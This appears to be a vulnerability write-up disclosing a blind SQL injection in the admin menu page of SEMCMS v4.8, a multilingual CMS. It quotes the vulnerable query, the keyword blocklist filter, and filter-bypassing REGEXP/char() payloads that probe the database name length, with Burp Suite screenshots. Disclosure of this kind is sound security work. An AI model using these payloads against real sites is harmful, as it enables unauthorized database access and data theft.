Introduction to Semcms

SEMCMS is a foreign trade website content management system (CMS) that supports multiple languages.
```
v4.8 Download Link: http://www.sem-cms.com/TradeCmsdown/php/semcms_php_4.8.zip
```


Causes of vulnerabilities:

/xcR45q_Admin/SEMCMS_Menu.php Line 66




Vulnerability code:


```
<?php
 } elseif ($type == "edit") {
 
   $row = mysqli_fetch_array($db_conn->query("SELECT * FROM sc_menu WHERE ID=" . $_GET["ID"]));
 
   ?>
```


It can be seen that the ID here will execute an SQL statement when passing parameters through GET


Filter code at/Include/contorl. PHP


Line 151


```
function test_input($data) { 
    //$data = str_replace("%", "percent", $data);
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data,*ENT_QUOTES*);
    return $data;
  }
```

And the 8th line


```
function inject_check_sql($sql_str) {
 
   return preg_match('/select|and|insert|=|%|<|between|update|\'|\*|union|into|load_file|outfile/i',$sql_str); 
 } 
 function verify_str($str) { 
    if(inject_check_sql($str)) {
      exit('Sorry,You do this is wrong! (.-.)');
     } 
   return $str;
 } 
```

 

By filtering the above content, we can construct a payload


```
-1%20or%20length(database())%20REGEXP%20char(94,53,36)
```

 


Recurrence of vulnerabilities

 
visit a website


```
http://url/xcR45q_Admin/SEMCMS_Menu.php
```

 

Brupsuite packet capture, Due to the length of the database name being 5 when creating a new site, the payload is constructed as


```
-1%20or%20length(database())%20REGEXP%20char(94,53,36)
```

（Determine if the length of the database name is 5）

 
Insert payload to view echo
 

![clip_image002](https://github.com/tzyyyyyyy/zemcms/assets/118863363/0b477628-181f-4feb-b1d3-3accffff8695)


Change the payload at this time

```
-1%20or%20length(database())%20REGEXP%20char(94,54,36)
```

（Determine if the length of the database name is 6） 

Change the payload at this time 

![clip_image004](https://github.com/tzyyyyyyy/zemcms/assets/118863363/c429a3bf-3004-43e7-a772-7f61ade3a220)

 
SQL injection can continue based on changes in the page in the future
